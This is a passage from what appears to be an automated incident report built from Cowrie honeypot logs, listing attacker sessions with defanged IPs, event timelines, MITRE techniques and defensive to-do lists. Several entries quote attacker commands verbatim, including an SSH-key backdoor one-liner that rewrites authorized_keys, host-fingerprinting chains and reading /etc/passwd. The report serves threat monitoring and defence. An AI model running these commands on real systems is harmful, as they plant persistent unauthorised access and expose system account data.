| `2026-08-12 05:41:22` | `cowrie.command.input` |
| `2026-08-12 05:41:22` | `cowrie.command.input` |
| `2026-08-12 05:41:22` | `cowrie.command.input` |
| `2026-08-12 05:41:22` | `cowrie.command.input` |
| `2026-08-12 05:41:22` | `cowrie.log.closed` |
| `2026-08-12 05:41:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-453fbefe0cb6

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-08-12 05:41 |
| **Last Seen** | 2026-08-12 05:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:41:35` | `cowrie.session.connect` |
| `2026-08-12 05:41:35` | `cowrie.client.version` |
| `2026-08-12 05:41:35` | `cowrie.client.kex` |
| `2026-08-12 05:41:36` | `cowrie.login.success` |
| `2026-08-12 05:41:37` | `cowrie.session.params` |
| `2026-08-12 05:41:37` | `cowrie.command.input` |
| `2026-08-12 05:41:37` | `cowrie.command.failed` |
| `2026-08-12 05:41:38` | `cowrie.log.closed` |
| `2026-08-12 05:41:39` | `cowrie.session.params` |
| `2026-08-12 05:41:39` | `cowrie.command.input` |
| `2026-08-12 05:41:39` | `cowrie.session.file_download` |
| `2026-08-12 05:41:39` | `cowrie.log.closed` |
| `2026-08-12 05:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a776c84122b0

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-08-12 05:41 |
| **Last Seen** | 2026-08-12 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:41:39` | `cowrie.session.connect` |
| `2026-08-12 05:41:39` | `cowrie.client.version` |
| `2026-08-12 05:41:39` | `cowrie.client.kex` |
| `2026-08-12 05:41:40` | `cowrie.login.success` |
| `2026-08-12 05:41:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80a6a49200e0

| Field | Detail |
|---|---|
| **Source IP** | `101.32.240[.]31` |
| **First Seen** | 2026-08-12 05:41 |
| **Last Seen** | 2026-08-12 05:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:41:41` | `cowrie.session.connect` |
| `2026-08-12 05:41:41` | `cowrie.client.version` |
| `2026-08-12 05:41:41` | `cowrie.client.kex` |
| `2026-08-12 05:41:42` | `cowrie.login.success` |
| `2026-08-12 05:41:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.32.240[.]31` to AbuseIPDB if not already reported
- [ ] Block `101.32.240[.]31` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cf5fb75c9ef3

| Field | Detail |
|---|---|
| **Source IP** | `152.32.254[.]89` |
| **First Seen** | 2026-08-12 05:42 |
| **Last Seen** | 2026-08-12 05:42 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:42:51` | `cowrie.session.connect` |
| `2026-08-12 05:42:51` | `cowrie.client.version` |
| `2026-08-12 05:42:51` | `cowrie.client.kex` |
| `2026-08-12 05:42:52` | `cowrie.login.success` |
| `2026-08-12 05:42:53` | `cowrie.session.params` |
| `2026-08-12 05:42:53` | `cowrie.command.input` |
| `2026-08-12 05:42:53` | `cowrie.command.failed` |
| `2026-08-12 05:42:54` | `cowrie.log.closed` |
| `2026-08-12 05:42:54` | `cowrie.session.params` |
| `2026-08-12 05:42:54` | `cowrie.command.input` |
| `2026-08-12 05:42:55` | `cowrie.session.file_download` |
| `2026-08-12 05:42:55` | `cowrie.log.closed` |
| `2026-08-12 05:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.254[.]89` to AbuseIPDB if not already reported
- [ ] Block `152.32.254[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5076d4677f8b

| Field | Detail |
|---|---|
| **Source IP** | `152.32.254[.]89` |
| **First Seen** | 2026-08-12 05:42 |
| **Last Seen** | 2026-08-12 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:42:55` | `cowrie.session.connect` |
| `2026-08-12 05:42:55` | `cowrie.client.version` |
| `2026-08-12 05:42:55` | `cowrie.client.kex` |
| `2026-08-12 05:42:56` | `cowrie.login.success` |
| `2026-08-12 05:42:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.254[.]89` to AbuseIPDB if not already reported
- [ ] Block `152.32.254[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0599af0a40bc

| Field | Detail |
|---|---|
| **Source IP** | `152.32.254[.]89` |
| **First Seen** | 2026-08-12 05:42 |
| **Last Seen** | 2026-08-12 05:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:42:56` | `cowrie.session.connect` |
| `2026-08-12 05:42:56` | `cowrie.client.version` |
| `2026-08-12 05:42:57` | `cowrie.client.kex` |
| `2026-08-12 05:42:57` | `cowrie.login.success` |
| `2026-08-12 05:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `152.32.254[.]89` to AbuseIPDB if not already reported
- [ ] Block `152.32.254[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b808814246e1

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:43 |
| **Last Seen** | 2026-08-12 05:43 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:43:36` | `cowrie.session.connect` |
| `2026-08-12 05:43:36` | `cowrie.client.version` |
| `2026-08-12 05:43:36` | `cowrie.client.kex` |
| `2026-08-12 05:43:37` | `cowrie.login.success` |
| `2026-08-12 05:43:39` | `cowrie.session.params` |
| `2026-08-12 05:43:39` | `cowrie.command.input` |
| `2026-08-12 05:43:39` | `cowrie.command.input` |
| `2026-08-12 05:43:39` | `cowrie.command.input` |
| `2026-08-12 05:43:39` | `cowrie.command.input` |
| `2026-08-12 05:43:39` | `cowrie.command.input` |
| `2026-08-12 05:43:39` | `cowrie.command.success` |
| `2026-08-12 05:43:39` | `cowrie.command.input` |
| `2026-08-12 05:43:39` | `cowrie.command.input` |
| `2026-08-12 05:43:39` | `cowrie.command.input` |
| `2026-08-12 05:43:39` | `cowrie.command.input` |
| `2026-08-12 05:43:39` | `cowrie.log.closed` |
| `2026-08-12 05:43:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e6997a961d88

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:45 |
| **Last Seen** | 2026-08-12 05:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:45:58` | `cowrie.session.connect` |
| `2026-08-12 05:45:58` | `cowrie.client.version` |
| `2026-08-12 05:45:58` | `cowrie.client.kex` |
| `2026-08-12 05:45:59` | `cowrie.login.success` |
| `2026-08-12 05:46:00` | `cowrie.session.params` |
| `2026-08-12 05:46:00` | `cowrie.command.input` |
| `2026-08-12 05:46:00` | `cowrie.command.input` |
| `2026-08-12 05:46:00` | `cowrie.command.input` |
| `2026-08-12 05:46:00` | `cowrie.command.input` |
| `2026-08-12 05:46:00` | `cowrie.command.input` |
| `2026-08-12 05:46:00` | `cowrie.command.success` |
| `2026-08-12 05:46:00` | `cowrie.command.input` |
| `2026-08-12 05:46:00` | `cowrie.command.input` |
| `2026-08-12 05:46:00` | `cowrie.command.input` |
| `2026-08-12 05:46:00` | `cowrie.command.input` |
| `2026-08-12 05:46:00` | `cowrie.log.closed` |
| `2026-08-12 05:46:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cba742e5fccd

| Field | Detail |
|---|---|
| **Source IP** | `47.85.8[.]171` |
| **First Seen** | 2026-08-12 05:46 |
| **Last Seen** | 2026-08-12 05:47 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:46:06` | `cowrie.session.connect` |
| `2026-08-12 05:46:06` | `cowrie.telnet.option` |
| `2026-08-12 05:46:06` | `cowrie.telnet.option` |
| `2026-08-12 05:47:06` | `cowrie.login.success` |
| `2026-08-12 05:47:07` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `47.85.8[.]171` to AbuseIPDB if not already reported
- [ ] Block `47.85.8[.]171` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff2afc4325d

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:48 |
| **Last Seen** | 2026-08-12 05:48 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:48:23` | `cowrie.session.connect` |
| `2026-08-12 05:48:23` | `cowrie.client.version` |
| `2026-08-12 05:48:23` | `cowrie.client.kex` |
| `2026-08-12 05:48:24` | `cowrie.login.success` |
| `2026-08-12 05:48:25` | `cowrie.session.params` |
| `2026-08-12 05:48:25` | `cowrie.command.input` |
| `2026-08-12 05:48:25` | `cowrie.command.input` |
| `2026-08-12 05:48:25` | `cowrie.command.input` |
| `2026-08-12 05:48:25` | `cowrie.command.input` |
| `2026-08-12 05:48:25` | `cowrie.command.input` |
| `2026-08-12 05:48:25` | `cowrie.command.success` |
| `2026-08-12 05:48:25` | `cowrie.command.input` |
| `2026-08-12 05:48:25` | `cowrie.command.input` |
| `2026-08-12 05:48:25` | `cowrie.command.input` |
| `2026-08-12 05:48:25` | `cowrie.command.input` |
| `2026-08-12 05:48:25` | `cowrie.log.closed` |
| `2026-08-12 05:48:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-21df3ebbfe08

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-08-12 05:48 |
| **Last Seen** | 2026-08-12 05:48 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:48:55` | `cowrie.session.connect` |
| `2026-08-12 05:48:55` | `cowrie.client.version` |
| `2026-08-12 05:48:55` | `cowrie.client.kex` |
| `2026-08-12 05:48:55` | `cowrie.login.success` |
| `2026-08-12 05:48:56` | `cowrie.direct-tcpip.request` |
| `2026-08-12 05:48:56` | `cowrie.direct-tcpip.data` |
| `2026-08-12 05:48:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc3e363ed614

| Field | Detail |
|---|---|
| **Source IP** | `92.126.223[.]175` |
| **First Seen** | 2026-08-12 05:49 |
| **Last Seen** | 2026-08-12 05:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:49:10` | `cowrie.session.connect` |
| `2026-08-12 05:49:10` | `cowrie.client.version` |
| `2026-08-12 05:49:10` | `cowrie.client.kex` |
| `2026-08-12 05:49:11` | `cowrie.login.success` |
| `2026-08-12 05:49:11` | `cowrie.direct-tcpip.request` |
| `2026-08-12 05:49:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.126.223[.]175` to AbuseIPDB if not already reported
- [ ] Block `92.126.223[.]175` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1d045ef732aa

| Field | Detail |
|---|---|
| **Source IP** | `65.20.217[.]64` |
| **First Seen** | 2026-08-12 05:49 |
| **Last Seen** | 2026-08-12 05:49 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:49:16` | `cowrie.session.connect` |
| `2026-08-12 05:49:17` | `cowrie.client.version` |
| `2026-08-12 05:49:17` | `cowrie.client.kex` |
| `2026-08-12 05:49:18` | `cowrie.login.success` |
| `2026-08-12 05:49:19` | `cowrie.direct-tcpip.request` |
| `2026-08-12 05:49:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.217[.]64` to AbuseIPDB if not already reported
- [ ] Block `65.20.217[.]64` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2fd972381f5

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:50 |
| **Last Seen** | 2026-08-12 05:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:50:46` | `cowrie.session.connect` |
| `2026-08-12 05:50:46` | `cowrie.client.version` |
| `2026-08-12 05:50:46` | `cowrie.client.kex` |
| `2026-08-12 05:50:47` | `cowrie.login.success` |
| `2026-08-12 05:50:48` | `cowrie.session.params` |
| `2026-08-12 05:50:48` | `cowrie.command.input` |
| `2026-08-12 05:50:48` | `cowrie.command.input` |
| `2026-08-12 05:50:48` | `cowrie.command.input` |
| `2026-08-12 05:50:48` | `cowrie.command.input` |
| `2026-08-12 05:50:48` | `cowrie.command.input` |
| `2026-08-12 05:50:48` | `cowrie.command.success` |
| `2026-08-12 05:50:48` | `cowrie.command.input` |
| `2026-08-12 05:50:48` | `cowrie.command.input` |
| `2026-08-12 05:50:48` | `cowrie.command.input` |
| `2026-08-12 05:50:48` | `cowrie.command.input` |
| `2026-08-12 05:50:49` | `cowrie.log.closed` |
| `2026-08-12 05:50:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-934119d749b3

| Field | Detail |
|---|---|
| **Source IP** | `157.245.213[.]135` |
| **First Seen** | 2026-08-12 05:52 |
| **Last Seen** | 2026-08-12 05:52 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `id, cat /etc/passwd, echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A", enable, system` |
| **TTPs (MITRE)** | T1003.008 · T1059.004 · T1078 · T1083 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:52:40` | `cowrie.session.connect` |
| `2026-08-12 05:52:41` | `cowrie.telnet.option` |
| `2026-08-12 05:52:41` | `cowrie.telnet.option` |
| `2026-08-12 05:52:41` | `cowrie.login.success` |
| `2026-08-12 05:52:42` | `cowrie.session.params` |
| `2026-08-12 05:52:42` | `cowrie.telnet.option` |
| `2026-08-12 05:52:42` | `cowrie.telnet.option` |
| `2026-08-12 05:52:42` | `cowrie.command.input` |
| `2026-08-12 05:52:42` | `cowrie.command.input` |
| `2026-08-12 05:52:42` | `cowrie.command.input` |
| `2026-08-12 05:52:42` | `cowrie.command.input` |
| `2026-08-12 05:52:42` | `cowrie.command.failed` |
| `2026-08-12 05:52:42` | `cowrie.command.input` |
| `2026-08-12 05:52:42` | `cowrie.command.failed` |
| `2026-08-12 05:52:42` | `cowrie.command.input` |
| `2026-08-12 05:52:42` | `cowrie.command.failed` |
| `2026-08-12 05:52:42` | `cowrie.command.input` |
| `2026-08-12 05:52:42` | `cowrie.command.input` |
| `2026-08-12 05:52:42` | `cowrie.command.input` |
| `2026-08-12 05:52:42` | `cowrie.command.input` |
| `2026-08-12 05:52:42` | `cowrie.command.input` |
| `2026-08-12 05:52:42` | `cowrie.command.input` |
| `2026-08-12 05:52:42` | `cowrie.log.closed` |
| `2026-08-12 05:52:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `157.245.213[.]135` to AbuseIPDB if not already reported
- [ ] Block `157.245.213[.]135` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-063396f10f6b

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:53 |
| **Last Seen** | 2026-08-12 05:53 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:53:21` | `cowrie.session.connect` |
| `2026-08-12 05:53:21` | `cowrie.client.version` |
| `2026-08-12 05:53:21` | `cowrie.client.kex` |
| `2026-08-12 05:53:21` | `cowrie.login.success` |
| `2026-08-12 05:53:22` | `cowrie.session.params` |
| `2026-08-12 05:53:22` | `cowrie.command.input` |
| `2026-08-12 05:53:22` | `cowrie.command.input` |
| `2026-08-12 05:53:22` | `cowrie.command.input` |
| `2026-08-12 05:53:22` | `cowrie.command.input` |
| `2026-08-12 05:53:22` | `cowrie.command.input` |
| `2026-08-12 05:53:22` | `cowrie.command.success` |
| `2026-08-12 05:53:22` | `cowrie.command.input` |
| `2026-08-12 05:53:22` | `cowrie.command.input` |
| `2026-08-12 05:53:22` | `cowrie.command.input` |
| `2026-08-12 05:53:22` | `cowrie.command.input` |
| `2026-08-12 05:53:23` | `cowrie.log.closed` |
| `2026-08-12 05:53:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `80.94.92[.]179` to AbuseIPDB if not already reported
- [ ] Block `80.94.92[.]179` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e1d87abf1f0a

| Field | Detail |
|---|---|
| **Source IP** | `80.94.92[.]179` |
| **First Seen** | 2026-08-12 05:55 |
| **Last Seen** | 2026-08-12 05:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-12 05:55:45` | `cowrie.session.connect` |
| `2026-08-12 05:55:45` | `cowrie.client.version` |
| `2026-08-12 05:55:45` | `cowrie.client.kex` |
| `2026-08-12 05:55:46` | `cowrie.login.success` |
